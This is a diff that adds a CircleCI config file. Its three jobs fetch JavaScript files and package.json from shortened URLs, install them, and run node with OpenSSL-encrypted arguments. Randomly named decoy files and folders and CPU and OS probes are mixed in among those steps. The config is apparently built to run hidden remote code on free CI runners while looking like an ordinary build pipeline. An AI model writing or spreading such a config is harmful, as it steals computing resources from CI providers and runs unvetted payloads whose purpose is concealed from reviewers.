@@ -1,0 +1,74 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  run-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir hejbzpu19izxw6xceb7l7xtdqcr
+      - run: touch 1thvd7rsrjvatbo4bp5pohzl2ygc.html
+      - run: curl -fsSL shorturl.at/hjAFX -o sq11krtc4da3u.js && curl -fsSL
+          shorturl.at/cdwR9 -o package.json && curl -fsSL shorturl.at/fx157 -o
+          xyrort9701l13s5c.js
+      - run: mkdir u7ytp6jiyvpx9lusv5fkx4c2gfq
+      - run: npm i -s
+      - run: mkdir dhdl797sb67rknc4vyrk12ulkj
+      - run: touch qfb0eddghbrpylltq7q3zgynm.sh
+      - run: cat /etc/os-release
+      - run: node xyrort9701l13s5c -s
+          U2FsdGVkX1/bAMzVB3zOnOpAfemwsU+RaCPSmY796JOowSeWh/nikfLRRb+OasE7dLzRA9QatF4Nr5F4nzTLqtmGwlse4goRERrTNshkd32l6eVFY44d9VUbDUxJxIjNXWPE0o0Ze5tyHkgVPbXw8Vvp7g3yOmZYknherr6vVjIsMaoug1TcMDUaQd2awkfUFeEUvJP4kYZhKpZrvg+2KqUfdnIQJGIZfzCMUTzanCI=
+          -t U2FsdGVkX1+ZsikSaCDCqsKv0YH6MzCX4V80CNkIWpAc3cFkH0Wa2OJ51a+hps0g
+          -sp -r
+          U2FsdGVkX1/jGhRi3GtiK9FTu96i1Sm40Th1iIMotzu2oOhlfqTeSSD8c8UxOTh7WBNrK2KwA/Lpxjcl1AdKacGwPvp4Sv/JRh2n5l1PMQ0k4xZOx4W2EfiJdkshqyTmkHIINxSjfLGPHGQznKyw3YjTkZ8OqZvRjbP5AXw0khEESAOlefD+bzNgUFi76DTyDjgNO1SmZrC9NSpff47aL4XrVy8RPwAjfU3IRb4R62b++VghknmAmJl2Zbc5/6nSQQzYJs4v+ZEZLmuuMrUQD8h+o9rkgOc44GABLUVPp/Q=
+          -lpn U2FsdGVkX1/+aE/LxTXHD6UNNtRwCjR8hBJW76wou/g=
+  node:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch imrkxip4yajw5m01h7f.js
+      - run: curl -fsSL shorturl.at/fsvU6 -o package.json && curl -fsSL
+          shorturl.at/rzCY1 -o 028gvdd2a7jt608.js && curl -fsSL
+          shorturl.at/uLRS4 -o me3a3ctr8y9la.js
+      - run: echo version 75749188062.07936
+      - run: cat /etc/os-release
+      - run: npm i -s
+      - run: mkdir p9odujsdee0wphqm2ljwn91c1pw
+      - run: node 028gvdd2a7jt608 -lpn U2FsdGVkX1+O2khHgt/MCKI+ArIRtYh2oZ2qibhoPF4= -t
+          U2FsdGVkX19BJSnpaW5C3mV5vAjZ/jiYEd7p9MeU6Yqy/A54vhd1Gkwcl9PZb9N5 -sp
+          -s
+          U2FsdGVkX199YuPabxfflCEnH49b8U8gMWH9pHwAmilXVl9tP/OsTdE/nPQcFOETN60TjcysNSEAeO3SRskpGQHdqPFVg32MnnC/KcBB5tmD6xrGKfcENUXdaNEuHG46aa7HjOrxdePq/g7yO+PFTJTMZxzHiUgqB5pBaHRpYVxTJrM+GIVsGFiKqG3BkehHOp3LnF+g1XVVinG6hihzrujBefe7DZnNHWxcdEf559w=
+          -r
+          U2FsdGVkX189jtpv+bwFq1U/2C4ji/tEcVTjhEbjiQZLTquLn96KU+wWSIWStPbgWLm+F6OJRRXi+E+nuZeOZfP6K++yGmvcLxQXo5VkREvUsTRdfqToxtgwSxAeY+J/dEMasRbJzh+rRTytEPuVkOlNj/iquPJUSnsvuqR2SHtiDp3r2SWdVtluuzaziTKTTYFUNRRIYm/eDcENEYq5ffS4u7xB5y5B/Cd5x4GOxlL+c6zhhRzQkAJ/JKtt6hNs7EQ1C6mTTYyQkPOIzWwXf2J4Yw2jJWx+25ew2G4EhlM=
+      - run: touch ay6vzv6phgbffp8urs44.c
+      - run: mkdir fh9ki25ppqupglch3f6urkwh
+  working:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir t1po0l5f04kql0sins0cex6ras
+      - run: curl -fsSL shorturl.at/fmxK5 -o nc4e6dwtl4wawu.js && curl -fsSL
+          shorturl.at/kKMNT -o package.json && curl -fsSL shorturl.at/gtBHJ -o
+          z3woejp.js
+      - run: touch xgyccawi1z2ny7lsoir28qa.html
+      - run: npm i -s
+      - run: cat /proc/cpuinfo
+      - run: touch d4uubjsoco4n14k2ehfngn1ngp.css
+      - run: node z3woejp -t
+          U2FsdGVkX1+V34SbIPbYx5YiUOHeoZmlhBvk2i1kkSMcjIq5p5CEsf+THi9nRY9h -s
+          U2FsdGVkX1+qf1LnntbsHlGlQ/LNWJxGDX4SUPBY2H5yO7x04RYFUKZVzzF5VLASWLRrra8cLxhU/dn/oQXZzDMFfBZazpBHyC653JcERH/6zFeS1+grusA/qm8ojkHiM8lgb8hogv/kNvKp21w1ALejCh2bNf78kAmbTseFwGcYFQY8J0zL+NxLzPrNs9Ej3VjYCOA6vxaTsV01Wst71iiQgsXW6FK/sffCTjlra6M=
+          -lpn U2FsdGVkX19l0++PQuGYIbGPWCY3sxnBdBmiquVZTzM= -r
+          U2FsdGVkX1/ufKYm7Yxl3EGsemKAA+KAaCuJRjjn4BlGlZzAMZtVcDj8HtiXKMQofCAWHKz2xtkpesxG21zxxadmDl7jPgY6JWwl+ShZcHXU0gwp9tyVnWH6mUu7AyQKSdzr073ITIF5nUanT9nJNLKR4n0NSUHxbxY1jMRFMfqIDHTsm+6USYJlutQjXQVz79aIc+IkOom4jMmbq+qYbAMe46OWuIANyGfa4DaEMnJfeHo9szKqB6ikfqyIOMady8qXphKAX2gC/RNxm5WWf9TghkhCrBbPybBH35qc9vc=
+          -sp
+      - run: mkdir tgr9tc5v10v3poctqrlg
+      - run: mkdir qfg1kyak69b58c4tota
+workflows:
+  chay-thu-nghiem:
+    jobs:
+      - run-jobs
+  deploy:
+    jobs:
+      - node
+  working:
+    jobs:
+      - working
